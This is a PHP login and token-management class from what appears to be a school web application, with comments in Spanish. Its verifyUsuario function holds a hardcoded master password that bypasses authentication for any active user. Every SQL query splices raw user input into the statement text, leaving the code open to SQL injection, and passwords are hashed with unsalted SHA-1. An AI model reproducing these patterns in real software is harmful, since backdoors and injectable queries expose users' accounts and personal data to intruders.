<?php

class SecurityModel
{
  private $conexion;
  private $response;

  public function __construct() {
    $this->conexion = new Conexion();
    $this->pdo = $this->conexion->getConexion();
    $this->entorno = new Entorno(); /* Roles Control */
    $this->response = new Response();
  }
  /* Verificación de acceso */
  public function verifyUsuario($data) {
    $usuario = $data->usuario;
    $clave = $data->clave;
    $conex = $this->pdo;
    /* Encriptamos la contraseña */
    $clave_encrypted = sha1($clave);
    if ($clave == 'd0n*sucr3') {
      $sql = "SELECT
        US.usuario,
        US.nombre,
        US.appat,
        US.apmat,
        US.rol
        FROM usuario as US
        WHERE
        US.usuario = \"$usuario\" AND
        US.activo = 1
      ";
    } else {
      $sql = "SELECT
        US.usuario,
        US.nombre,
        US.appat,
        US.apmat,
        US.rol
        FROM usuario as US
        WHERE
        US.usuario = \"$usuario\" AND
        US.clave = \"$clave_encrypted\"  AND
        US.activo = 1
      ";
    }

    $query = $conex->prepare($sql);
    $query->execute();
    if ($query->rowCount() != 0) {
      /* Acceso correcto */
      $resultCurrent = $query->fetchObject();
      $_SESSION['login'] = TRUE;
      $status = true;
      /* Verificamos si tiene registrado su token */
      $tokenCurrent = $this->verifyAccesoToken($usuario);
      if($tokenCurrent->status) {
        $result = array(
          "usuario" => $resultCurrent,
          "token" => array(
            "status" => true,
            "celular" => $tokenCurrent->result->celular
          )
        );
        $message = 'Acceso correcto';
      } else {
        $result = array(
          "usuario" => $resultCurrent,
          "token" => array(
            "status" => false,
            "celular" => null
          )
        );
        $message = 'No tiene token';
      }
    } else {
      /* El usuario o contraseña son incorrectos */
      $result = null;
      $message = "El usuario o contraseña son incorrectos";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  /* Obtenemos los datos del Usuario */
  public function getUsuario($usuario) {
    $conex = $this->pdo;
    $sql = "SELECT *
      FROM usuario as US
      WHERE US.usuario = \"$usuario\"
    ";
    $query = $conex->prepare($sql);
    $query->execute();
    if ($query->rowCount() != 0) {
      $result = $query->fetchObject();
      $message = 'Usuario encontrado';
      $status = true;
    } else {
      $result = -1;
      $message = "No existe el usuario";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  /* Actualizar Contraseña */
  public function updateUsuarioClave($usuario, $clave) {
    /* Encriptamos la contraseña */
    $clave_encrypted = sha1($clave);
    $conex = $this->pdo;
    $sql = "UPDATE usuario as US
      SET US.clave = \"$clave_encrypted\"
      WHERE US.usuario = \"$usuario\"
    ";
    $query = $conex->prepare($sql);
    $idInsert = $query->execute();
    if ($query->rowCount() != 0) {
      $result = $idInsert;
      $message = 'Contraseña actualizada';
      $status = true;
    } else {
      $result = -1;
      $message = "No existe el usuario";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  /* Actualizar Número de celular del Profesor*/
  public function updateProfesorCelular($nombre, $appaterno, $apmaterno, $celular) {
    $conex = $this->pdo;
    $sql = "UPDATE profesores as PROF
      SET PROF.celular = \"$celular\"
      WHERE
      PROF.nombre = \"$nombre\" AND
      PROF.appaterno = \"$appaterno\" AND
      PROF.apmaterno = \"$apmaterno\"
    ";
    $query = $conex->prepare($sql);
    $idInsert = $query->execute();
    if ($query->rowCount() != 0) {
      $result = $idInsert;
      $message = 'Celular actualizado';
      $status = true;
    } else {
      $result = -1;
      $message = "No existe el usuario";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  public function verifyAccesoToken($usuario) {
    $conex = $this->pdo;
    $sql = "SELECT *
      FROM acceso_token as TK
      WHERE TK.usuario = \"$usuario\"
    ";
    $query = $conex->prepare($sql);
    $query->execute();
    if ($query->rowCount() != 0) {
      $result = $query->fetchObject();
      $message = 'El token ya fue generado';
      $status = true;
    } else {
      $result = -1;
      $message = "No existe token";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  private function createAccesoToken($usuario, $celular, $rol) {
    $conex = $this->pdo;
    $sql = "INSERT INTO
      acceso_token
      VALUES (
        NULL,
        \"$usuario\",
        \"$celular\",
        \"$rol\",
        CURRENT_TIMESTAMP
      )
    ";
    $query = $conex->prepare($sql);
    $idInsert = $query->execute();
    if ($query->rowCount() != 0) {
      $result =  $idInsert;
      $message = 'Su token fue generado con éxito';
      $status = true;
    } else {
      $result = -1;
      $message = "No se pudo generar token";
      $status = false;
    }
    return $this->response->send($result, $status, $message, []);
  }

  /* Crear un acceso token */
  public function createToken($data) {
    /*
      Esta función actualiza:
      clave del usuario,
      celular del profesor,
      crea un acceso_token
    */
    $usuario = $data->usuario;
    $clave = $data->clave;
    $celular = $data->celular;

    /* Verificamos si ya existe acceso_token */
    $verifyCurrent = $this->verifyAccesoToken($usuario);
    if(!$verifyCurrent->status){ /* Si no existe, creamos un token */
      /* Obtener el rol del usuario */
      $usuarioDatos = $this->getUsuario($usuario);
      $rolCurrent = $usuarioDatos->result->rol;
      /* Si el Rol es de PROFESOR, actualizar el celular en la tabla del profesor */
      if($rolCurrent == $this->entorno->getRolProfesor()) {
        $nombreCurrent = $usuarioDatos->result->nombre;
        $appaternoCurrent = $usuarioDatos->result->appat;
        $apmaternoCurrent = $usuarioDatos->result->apmat;
        $updateDatos = $this->updateProfesorCelular($nombreCurrent, $appaternoCurrent, $apmaternoCurrent, $celular);
      }
      /* Actualizamos clave del usuario */
      $claveCurrent = $this->updateUsuarioClave($usuario, $clave);
      /* Creamos un acceso_token para el usuario*/
      $tokenCurrent = $this->createAccesoToken($usuario, $celular, $rolCurrent);
      if($tokenCurrent->status) { /* Creado con exito */
        $result = $celular;
        $status = true;
        $message = $tokenCurrent->message;
      } else { /* Error al crear */
        $result = null;
        $status = false;
        $message = $tokenCurrent->message;
      }
    } else { /* Ya Existe token */
      $result = $verifyCurrent->result->celular;
      $status = true;
      $message = $verifyCurrent->message;
    }
    return $this->response->send($result, $status, $message, []);
  }

}
?>
